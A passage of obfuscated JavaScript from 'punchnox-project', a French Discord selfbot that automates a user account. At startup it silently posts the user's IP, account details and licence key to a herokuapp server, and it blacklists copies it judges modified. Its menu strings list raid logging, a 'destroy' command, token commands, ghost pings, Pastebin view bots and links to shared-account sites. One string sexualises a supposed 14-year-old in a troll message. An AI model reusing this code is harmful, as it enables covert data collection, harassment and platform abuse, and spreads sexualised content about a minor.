                      if (bw.body.Reason.includes('putenox')) console.clear(), console.log('[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m'), aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send({
                        'Commande': 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE',
                        'Report_par': 'LE SELFBOT',
                        'User_id': aN.user.id,
                        'Reason': 'Utilise un version modifié du selfbot',
                        'Date_demande': ax().format('MM/DD/YYYY 𝙖 HH: ss')
                      }).end((c2, c3) => {
                        if (c2) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                      }), console.log('[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m'), process.exit();else {
                        if (bw.body.Reason.includes('crack')) {
                          console.clear();
                          console.log('[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m');
                          aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send({
                            'Commande': 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE',
                            'Report_par': 'LE SELFBOT',
                            'User_id': aN.user.id,
                            'Reason': 'Utilise un version modifié du selfbot',
                            'Date_demande': ax().format('MM/DD/YYYY 𝙖 HH: ss')
                          }).end((c3, c4) => {
                            if (c3) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                          });
                          console.log('[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m');
                          process.exit();
                        } else {
                          if (bw.body.Reason.includes('cracked')) {
                            console.clear(), console.log('[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m'), aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send({
                              'Commande': 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE',
                              'Report_par': 'LE SELFBOT',
                              'User_id': aN.user.id,
                              'Reason': 'Utilise un version modifié du selfbot',
                              'Date_demande': ax().format('MM/DD/YYYY 𝙖 HH: ss')
                            }).end((c3, c4) => {
                              if (c3) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                            }), console.log('[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m'), process.exit();
                          } else {
                            if (bw.body.Reason.includes('grabber')) {
                              console.clear();
                              console.log('[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m');
                              aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send({
                                'Commande': 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE',
                                'Report_par': 'LE SELFBOT',
                                'User_id': aN.user.id,
                                'Reason': 'Utilise un version modifié du selfbot',
                                'Date_demande': ax().format('MM/DD/YYYY 𝙖 HH: ss')
                              }).end((c4, c5) => {
                                if (c4) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                              });
                              console.log('[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m');
                              process.exit();
                            } else {
                              if (bw.body.Reason.includes('token')) {
                                console.clear();
                                console.log('[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m');
                                aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send({
                                  'Commande': 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE',
                                  'Report_par': 'LE SELFBOT',
                                  'User_id': aN.user.id,
                                  'Reason': 'Utilise un version modifié du selfbot',
                                  'Date_demande': ax().format('MM/DD/YYYY 𝙖 HH: ss')
                                }).end((c4, c5) => {
                                  if (c4) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                                });
                                console.log('[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m');
                                process.exit();
                              } else {
                                if (bw.body.Reason.includes('github')) {
                                  console.clear(), console.log('[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m'), aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send({
                                    'Commande': 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE',
                                    'Report_par': 'LE SELFBOT',
                                    'User_id': aN.user.id,
                                    'Reason': 'Utilise un version modifié du selfbot',
                                    'Date_demande': ax().format('MM/DD/YYYY 𝙖 HH: ss')
                                  }).end((c5, c6) => {
                                    if (c5) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                                  }), console.log('[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m'), process.exit();
                                } else {
                                  if (bw.body.Reason.includes('dsl')) {
                                    console.clear();
                                    console.log('[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m');
                                    aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send({
                                      'Commande': 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE',
                                      'Report_par': 'LE SELFBOT',
                                      'User_id': aN.user.id,
                                      'Reason': 'Utilise un version modifié du selfbot',
                                      'Date_demande': ax().format('MM/DD/YYYY 𝙖 HH: ss')
                                    }).end((c5, c6) => {
                                      if (c5) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                                    });
                                    console.log('[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m');
                                    process.exit();
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                  aD.post('https://punchnox-project-api.herokuapp.com/api/logs/logpremium').send({
                    'Ip': b5,
                    'Username': aN.user.username,
                    'User_Id': aN.user.id,
                    'User_created': ax.utc(aN.user.createdAt).format('MM/DD/YYYY 𝙖 HH: ss'),
                    'Avatar_Url': aN.user.avatarURL,
                    'Plateform': bF[aG.platform()],
                    'Status': bH[aN.user.presence.status],
                    'Play': aN.user.presence.game ? aN.user.presence.game.name : 'Aucun Jeux',
                    'Prefix': ab,
                    'Color_Embed': ad,
                    'Premium': bz ? 'Activé' : 'Désactivé',
                    'Key': ai,
                    'LAKEY': e.premium,
                    'Team': aa,
                    'Date': a6
                  }).end((c5, c6) => {
                    if (c5) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                    if (c6.body.status == false) var c9 = i('false');
                    ;
                    if (c6.body.status == true) var c9 = i('true');
                    ;
                    if (c9) {
                      const cd = c6.body.Reason;
                      aD.get('https://punchnox-project-api.herokuapp.com/api/raison/' + cd).then(ce => {
                        if (ce.body.Reason == 'Raison Not found.') {
                          aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send({
                            'Commande': 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE',
                            'Report_par': 'LE SELFBOT',
                            'User_id': aN.user.id,
                            'Reason': 'La raison du premium n\'existe pas! (possible usage d\'une version modifié du selfbot)',
                            'Date_demande': ax().format('MM/DD/YYYY 𝙖 HH: ss')
                          }).end((ck, cl) => {
                            if (ck) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                          });
                          console.clear();
                          console.log('[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m');
                          console.log('[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m');
                          process.exit();
                        }
                      });
                    }
                    try {
                      setTimeout(function () {
                        if (aY.includes(bd)) {
                          setTimeout(function () {
                            console.log(ay.hex(t)('\nBienvenue sur la version ' + aY + ' du punchnox-project')), console.log(ay.hex(x)('\nSelfbot développé par punchnox'));
                          }, 1000), setTimeout(function () {
                            console.log(ay.bgRed('[Selfbot] Fr: Je ne suis pas responsable si vous êtes banni de Discord ou de certains serveurs.')), console.log(ay.bgRed('[Selfbot] En: I am not responsible if you get banned from Discord or any guilds.'));
                            var cn = ['\n  ██████╗ ██╗   ██╗███╗   ██╗ ██████╗██╗  ██╗███╗   ██╗ ██████╗ ██╗  ██╗\n  ██╔══██╗██║   ██║████╗  ██║██╔════╝██║  ██║████╗  ██║██╔═══██╗╚██╗██╔╝\n  ██████╔╝██║   ██║██╔██╗ ██║██║     ███████║██╔██╗ ██║██║   ██║ ╚███╔╝ \n  ██╔═══╝ ██║   ██║██║╚██╗██║██║     ██╔══██║██║╚██╗██║██║   ██║ ██╔██╗ \n  ██║     ╚██████╔╝██║ ╚████║╚██████╗██║  ██║██║ ╚████║╚██████╔╝██╔╝ ██╗\n  ╚═╝      ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝\n  ', '                 \n                              __                    \n      ____  __  ______  _____/ /_  ____  ____  _  __\n     / __  / / / / __  / ___/ __  / __  / __  | |/_/\n    / /_/ / /_/ / / / / /__/ / / / / / / /_/ />  <  \n   / .___/ __,_/_/ /_/ ___/_/ /_/_/ /_/ ____/_/|_|  \n  /_/                                               \n  ', '\n                          _                     \n   _ __  _   _ _ __   ___| |__  _ __   _____  __\n  | \'_  | | | | \'_  / __| \'_  | \'_  / _   / /\n  | |_) | |_| | | | | (__| | | | | | | (_) >  < \n  | .__/  __,_|_| |_| ___|_| |_|_| |_| ___/_/ _   |_|                                           \n  ', '\n   ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄ \n  ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌▐░▌     ▐░▌\n  ▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀█░▌ ▐░▌   ▐░▌ \n  ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌       ▐░▌  ▐░▌ ▐░▌  \n  ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌ ▐░▌   ▐░▌▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌▐░▌       ▐░▌   ▐░▐░▌   \n  ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌  ▐░▌  ▐░▌▐░▌          ▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌       ▐░▌    ▐░▌    \n  ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░▌   ▐░▌ ▐░▌▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░▌       ▐░▌   ▐░▌░▌   \n  ▐░▌          ▐░▌       ▐░▌▐░▌    ▐░▌▐░▌▐░▌          ▐░▌       ▐░▌▐░▌    ▐░▌▐░▌▐░▌       ▐░▌  ▐░▌ ▐░▌  \n  ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄█░▌ ▐░▌   ▐░▌ \n  ▐░▌          ▐░░░░░░░░░░░▌▐░▌      ▐░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌      ▐░░▌▐░░░░░░░░░░░▌▐░▌     ▐░▌\n   ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀                                                                                 \n  ', '                 _               \n  ___ _ _ ___ ___| |_ ___ ___ _ _ \n  | . | | |   |  _|   |   | . |_\'_|\n  |  _|___|_|_|___|_|_|_|_|___|_,_|\n  |_|', '\n   ██▓███   █    ██  ███▄    █  ▄████▄   ██░ ██  ███▄    █  ▒█████  ▒██   ██▒\n  ▓██░  ██▒ ██  ▓██▒ ██ ▀█   █ ▒██▀ ▀█  ▓██░ ██▒ ██ ▀█   █ ▒██▒  ██▒▒▒ █ █ ▒░\n  ▓██░ ██▓▒▓██  ▒██░▓██  ▀█ ██▒▒▓█    ▄ ▒██▀▀██░▓██  ▀█ ██▒▒██░  ██▒░░  █   ░\n  ▒██▄█▓▒ ▒▓▓█  ░██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░▓█ ░██ ▓██▒  ▐▌██▒▒██   ██░ ░ █ █ ▒ \n  ▒██▒ ░  ░▒▒█████▓ ▒██░   ▓██░▒ ▓███▀ ░░▓█▒░██▓▒██░   ▓██░░ ████▓▒░▒██▒ ▒██▒\n  ▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒ ░░▒░▒░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░\n  ░▒ ░     ░░▒░ ░ ░ ░ ░░   ░ ▒░  ░  ▒    ▒ ░▒░ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░\n  ░░        ░░░ ░ ░    ░   ░ ░ ░         ░  ░░ ░   ░   ░ ░ ░ ░ ░ ▒   ░    ░  \n            ░              ░ ░ ░       ░  ░  ░         ░     ░ ░   ░    ░  \n                             ░                                             \n  ', '\n  ██████\u2001 ██\u2001   ██\u2001███\u2001   ██\u2001 ██████\u2001██\u2001  ██\u2001███\u2001   ██\u2001 ██████\u2001 ██\u2001  ██\u2001\n  ██\u2001\u2001\u2001██\u2001██\u2001   ██\u2001████\u2001  ██\u2001██\u2001\u2001\u2001\u2001\u2001\u2001██\u2001  ██\u2001████\u2001  ██\u2001██\u2001\u2001\u2001\u2001██\u2001\u2001██\u2001██\u2001\u2001\n  ██████\u2001\u2001██\u2001   ██\u2001██\u2001██\u2001 ██\u2001██\u2001     ███████\u2001██\u2001██\u2001 ██\u2001██\u2001   ██\u2001 \u2001███\u2001\u2001 \n  ██\u2001\u2001\u2001\u2001\u2001 ██\u2001   ██\u2001██\u2001\u2001██\u2001██\u2001██\u2001     ██\u2001\u2001\u2001██\u2001██\u2001\u2001██\u2001██\u2001██\u2001   ██\u2001 ██\u2001██\u2001 \n  ██\u2001     \u2001██████\u2001\u2001██\u2001 \u2001████\u2001\u2001██████\u2001██\u2001  ██\u2001██\u2001 \u2001████\u2001\u2001██████\u2001\u2001██\u2001\u2001 ██ \n  ', '\n   _______  __   __  __    _  _______  __   __  __    _  _______  __   __ \n  |       ||  | |  ||  |  | ||       ||  | |  ||  |  | ||       ||  |_|  |\n  |    _  ||  | |  ||   |_| ||       ||  |_|  ||   |_| ||   _   ||       |\n  |   |_| ||  |_|  ||       ||       ||       ||       ||  | |  ||       |\n  |    ___||       ||  _    ||      _||       ||  _    ||  |_|  | |     | \n  |   |    |       || | |   ||     |_ |   _   || | |   ||       ||   _   |\n  |___|    |_______||_|  |__||_______||__| |__||_|  |__||_______||__| |__|\n  '],
                              co = cn[Math.floor(Math.random() * cn.length)];
                            console.log(ay.hex(v)('\n' + co));
                            if (ag == 'on') var cp = 'activé';else var cp = 'désactivé';
                            if (ah == 'on') var cq = 'activé';else var cq = 'désactivé';
                            if (bo) var cr = 'Vous faites partie de la team : ' + bp + '.';else var cr = 'Vous ne faites pas partie d\'une team en alliance avec le punchnox-project.';
                            var cs = aN.user.friends.size;
                            if (aN.user.premium > 0) var ct = 'activé';else {
                              var ct = 'désactivé';
                            }
                            if (aN.user.bot) {
                              var cu = 'Tu es robot je ne peux pas charger le self desolé :/';
                              process.exit(1);
                            } else var cu = 'non';
                            console.log(ay.hex(E)('\n  ────────────────────────────────────────────────────────────────────\n  |-->  Pseudo     : ' + aN.user.username + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  Prefix     : ' + ab + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  Users      : ' + aN.guilds.map(cy => cy.memberCount).reduce((cy, cz) => cy + cz) + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  Bots       : ' + aN.users.filter(cy => cy.bot).size + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  Salons     : ' + aN.channels.size + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  Serveurs   : ' + aN.guilds.size + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  Amis       : ' + cs + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  premium    : ' + (c9 ? 'activé' : 'désactivé') + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  Nsfw       : ' + cp + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  Nitro      : ' + ct + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  Robots     : ' + cu + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  nitro claimer : ' + cq + '\n  |──────────────────────────────────────────────────────────────────|\n  |-->  Team : ' + cr + '\n  |──────────────────────────────────────────────────────────────────|')), aN.commands = new aw.Collection(), aB.readdir(f + '/commandes', (cy, cz) => {
                              if (cy) console.log(cy);
                              setTimeout(function () {
                                console.log(ay.hex(E)('\n  |-->  ' + cz.length + ' commandes custom trouvée.\n  |──────────────────────────────────────────────────────────────────|'));
                              }, 500);
                              var cA = cz.filter(cC => cC.split('.').pop() === 'js');
                              if (cA.length <= 0) return;
                              cA.forEach((cC, cD) => {
                                var cE = require(f + ('/commandes/' + cC));
                                aN.commands.set(cE.punchnox.name, cE);
                              });
                            }), aB.readdir(f + '/plugins', (cy, cz) => {
                              if (cy) console.log(cy);
                              setTimeout(function () {
                                console.log(ay.hex(E)('\n  |-->  ' + cz.length + ' plugins trouvée.\n  ────────────────────────────────────────────────────────────────────'));
                              }, 1000);
                              var cC = cz.filter(cD => cD.split('.').pop() === 'js');
                              if (cC.length <= 0) return;
                              cC.forEach((cD, cE) => {
                                var cF = require(f + ('/plugins/' + cD));
                                aN.commands.set(cF.punchnox.name, cF);
                              });
                            });
                          }, 1000), setTimeout(function () {
                            console.log(ay.hex(u)('\n\n{logs} :'));
                          }, 5000);
                        }
                        if (c9) {
                          var cg = '𝙥𝙧𝙚𝙢𝙞𝙪𝙢';
                        } else {
                          var cg = '𝙛𝙧𝙚𝙚';
                        }
                        var ch = ['logopunchnox', 'logopunchnox1', 'logopunchnox2', 'logopunchnox3'],
                          ci = ch[Math.floor(Math.random() * ch.length)],
                          cj = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, co => (co ^ Math.random() * 16 >> co / 4).toString(16));
                        aF.getRpcImage('713451199730548837', ci).then(co => {
                          var cp = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩-' + cg).setUrl(ae).setType('PLAYING').setApplicationId('713451199730548837').setAssetsLargeImage(co.id).setAssetsSmallImage(co.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩-' + cg).setState('version ' + aY).setDetails('développé par punchnox').setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM=').setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657').setSpectateSecret('MTIzNDV8MTIzNDV8MTMyNDU0').setStartTimestamp(Date.now()).setParty({
                            'id': cj()
                          });
                          aN.user.setPresence(cp.toDiscord());
                        }).catch(console.error), aN.on('rateLimit', (co, cp, cq, cr, cs) => {
                          console.log(co, cp, cq, cr, cs);
                        });
                      }, 1000);
                    } catch (ce) {
                      clearInterval(bD), console.clear(), console.log(ce);
                    }
                    const ca = require('events'),
                      cb = new ca();
                    cb.setMaxListeners(1000), process.on('unhandledRejection', (cf, cg) => {
                      if (cf.message === 'You are opening direct messages too fast.') {
                        return process.exit();
                      }
                      if (cf) return;
                    });
                    function cc(cf) {
                      return new Promise(cg => setTimeout(cg, cf));
                    }
                    if (aY.includes(bd)) {
                      aN.on('message', async cg => {
                        var ch = {};
                        ch.wXDiD = function (gJ, gK) {
                          return gJ(gK);
                        }, ch.ROTYr = '#FF7800', ch.oGiLK = '** 「MENU TOOLS」 **', ch.lBBmf = '```𝗩𝗲𝗿𝗶𝗳```', ch.qJsjU = '***Bienvenue sur le selfbot***', ch.baWdC = '***Affiche les infos sur la personne mentionner*** (sur serveur)', ch.nMNAE = '***Affiche les infos en DM (Moins d\'infos)***', ch.HueUP = '```𝗴𝗲𝘁𝗶𝗱```', ch.YqvEf = '***récupère l\'id de la personne mentionnée***', ch.qbwXK = '***Affiche la latance du self***', ch.ACDVN = '```𝗛𝗮𝘀𝘁```', ch.zJCxu = '***créer un hastebins***', ch.OLawg = '```𝗧𝗶𝗺𝗲```', ch.FXGlV = '***Affiche l\'heurs***', ch.gMInl = '```𝗪𝗮𝗿𝗻```', ch.yCjmU = '```𝗚𝗵𝗼𝘀𝘁𝗽𝗶𝗻𝗴```', ch.Mfgtj = '***fais un ghost ping***', ch.qrgzU = '```𝗔𝘃𝗮𝘁𝗮𝗿```', ch.bTYOI = '```𝙥𝙥 + {lien}```', ch.zbTvV = '```𝗺𝘆𝘁𝗼𝗸𝗲𝗻```', ch.jgvzO = '```𝗺𝘆𝗵𝗼𝘀𝘁𝗻𝗮𝗺𝗲```', ch.uSfpQ = '```𝗻𝗲𝘄𝘁𝗼𝗸𝗲𝗻```', ch.XFiCe = '```𝘀𝗵𝘂𝘁𝗱𝗼𝘄𝗻```', ch.mhGhX = '***étein le selfbot***', ch.JrtiZ = '```𝗿𝗲𝘀𝘁𝗮𝗿𝘁```', ch.Vuhru = '***relance le selfbot***', ch.wfHss = '***clear les logs (de la console)***', ch.hNBoR = '```𝗥𝗼𝗹𝗲𝗶𝗻𝗳𝗼```', ch.uSQnw = '```𝗰𝗵𝗲𝗰𝗸𝗵𝗼𝘀𝘁```', ch.AvmMt = '```𝗨𝗽𝘁𝗶𝗺𝗲```', ch.MlkRw = '***montre combien de temps vous avez passez sur le self***', ch.IYEnp = '```𝗿𝗲𝘃𝗮𝘃 + {mention}```', ch.RypJn = '***fais une recherche avec la pdp de la personne mentionnée***', ch.GeyfQ = '```𝗲𝗺𝗯𝗲𝗱```', ch.nPNGz = '***Fait un embed***', ch.aWBaa = '```𝗦𝗼𝗻𝗱 + 𝘁𝗲𝘅𝘁𝗲```', ch.bHPcn = '10%', ch.GAAvL = '25%', ch.lvAGn = '35%', ch.dcExo = '45%', ch.pLhkE = '50%', ch.iaJSB = '60%', ch.IQSyR = '70%', ch.HFQqo = '75%', ch.PmlbJ = '85%', ch.jJfiC = '90%', ch.IfYvY = '95%', ch.VedIR = '100%', ch.QHsSV = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.kHSHC = 'Commande gaycalc effectué', ch.pzOOl = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.IsXJe = 'https://some-random-api.ml/lyrics?title=', ch.GYkcQ = '[31mErreur lors de la connexion aux serveurs du punchnox-project[0m', ch.rsBFm = 'E-mail vérifié', ch.lMxCH = 'Inscrit depuis plus de 5min minimum', ch.LyGtB = 'Téléphone Vérifié', ch.Qlnbv = 'https://punchnox-project-api.herokuapp.com/api/logs/raidlogs', ch.LiQIt = 'destroy', ch.IXbbg = 'MM/DD/YYYY 𝙖 HH : ss', ch.Ctewx = '_________________________________________', ch.UZSVZ = 'ADMINISTRATOR', ch.vxlsO = 'non', ch.qbDpB = function (gJ) {
                          return gJ();
                        }, ch.OXILB = '[31mVous avez une version modifiée du punchnox-project c\'est possible que cette version contienne un token grabber je vous conseille de la désinstaller puis changer votre mot de passe.[0m', ch.BCabl = 'BLACKLISTE AUTOMATIQUE VERSION MOFIFIE', ch.MINfo = 'LE SELFBOT', ch.QAvRS = 'Utilise un version modifié du selfbot', ch.vjPGK = function (gJ) {
                          return gJ();
                        }, ch.UzoAF = '[31mUne demande de blackliste a été faite automatiquement par le selfbot[0m', ch.udqTe = function (gJ, gK) {
                          return gJ || gK;
                        }, ch.ajGix = 'true', ch.WjdQK = 'activate', ch.NKdTR = 'https://nekobot.xyz/api/image', ch.ilsSU = 'hentai_anal', ch.MAPAx = function (gJ, gK) {
                          return gJ(gK);
                        }, ch.lKSKM = 'ERROR', ch.zpHLe = 'un argument est nécessaire', ch.LkNGs = 'Tu dois poser une question !', ch.ruYwL = '**Sondage**', ch.lfwJR = 'Une erreur est survenue.', ch.vcDZN = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.ETfWj = '***la couleur à bien été changé en :*** ', ch.racNH = 'je suis zerator l\'enfant de 14 ans pour les nudes contactez moi ici: <@643080568074010686>\n', ch.XZhjf = 'brazzers.gif', ch.HOLgx = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.iGgLA = '***l\'image de l\'embed a été remplacé par :***', ch.Lpbjs = 'challenger.gif', ch.zdlCj = 'wanted.gif', ch.gsKxw = 'bolxK', ch.ruoFz = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.PfCxx = 'GET', ch.tkzUQ = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', ch.nkZGi = 'application/x-www-form-urlencoded; charset=UTF-8', ch.pvDTz = 'https://www.hastebin.com/documents', ch.gFRtZ = 'NSCns', ch.NwFbh = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.AobCY = 'OFiMe', ch.GiyEN = 'zsqSV', ch.GQTjy = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.RSdGq = 'les vus ont été ajouté! ', ch.uduzD = 'Vus ajoutés : ', ch.ybiXN = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.yiCvj = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30', ch.Jfahh = 'application/html', ch.HrkZB = '1|4|3|2|0', ch.GjPqe = '**Pastebin View Bots**', ch.rWtlX = 'https://upload.wikimedia.org/wikipedia/en/3/35/Pastebin.com_logo.png', ch.QfypY = '** 「MENU GENERATEUR」 **', ch.Tamth = '```𝗛-𝗴𝗲𝗻```', ch.cBxcc = '```𝗜𝗛𝗔𝗫```', ch.gKipN = '***https://ihax.fr/forums/partage-comptes-gratuit.20/***', ch.VorlY = '```𝗖𝘆𝗯𝗲𝗿-𝗵𝘂𝗯```', ch.mYlJu = '***https://cyber-hub.pw/***', ch.bDzcy = '***https://mega.nz/#!3SgRTQpI!xympEG5Z0YTh6WfcdxmyyHZESJQSu_h-JyDCb7jMFo4***', ch.PhNTc = 'https://media.giphy.com/media/giodsxr1sttIHeStIR/giphy.gif', ch.IqszU = function (gJ, gK, gL, gM) {
                          return gJ(gK, gL, gM);
                        }, ch.iMmSU = 'POST', ch.AiYbV = 'application/json', ch.AIqPB = '𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', ch.plYKp = 'https://vignette.wikia.nocookie.net/victor-dixen/images/6/60/Discord-logo.png/revision/latest/scale-to-width-down/340?cb=20180515202200&path-prefix=fr', ch.QHoNf = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.oCRiX = 'IBMlc', ch.pPUKl = 'en-US', ch.qoEZr = 'en-GB', ch.ugLnj = 'es-ES', ch.vgTWE = 'zh-TW', ch.YUxsl = 'zh-CN', ch.ZLzaU = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.hgNQZ = 'dark', ch.uybbE = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.fVred = 'PATCH', ch.Lzcah = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36', ch.tWTmZ = 'https://cdn.discordapp.com/attachments/708005751012196383/712767215702638622/20200520_140958.jpg', ch.Wxaoh = '**ISSOU**', ch.NClqM = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.YZXsr = ':x: **Commande uniquement utilisable sur un serveur**', ch.GmAYI = '***Vous n\'avez pas la permission*** "MANAGE_ROLES"', ch.ufUEi = '***Je ne trouve pas de role "Muted"***\n créez un role du nom Muted', ch.srbYN = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.RAaMq = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.dbnih = 'nitro boost', ch.XKbzz = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.zUKrC = 'TePIy', ch.QEmKS = 'Eiixw', ch.LlcaR = 'hRceK', ch.cUfDn = 'LEDiI', ch.LgAEv = 'oui', ch.IyIos = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.uRDvC = 'yBksa', ch.pJXEc = 'jdCvQ', ch.mCORp = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.CrltO = 'Token Info', ch.LsQfh = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.qHdYO = 'gkINE', ch.brogr = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.hinvr = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.imgGR = 'wAveR', ch.LsjQx = 'gCQWF', ch.xPJwL = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.EtFKO = 'AwRxQ', ch.pljLG = 'UYaXe', ch.jxgEr = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.Mxrbv = 'vHLQn', ch.BpdtD = 'DyMPu', ch.vVXjJ = 'WTICO', ch.KLlRu = 'nGCdF', ch.JMCwa = 'OirNF', ch.hbmZZ = function (gJ, gK) {
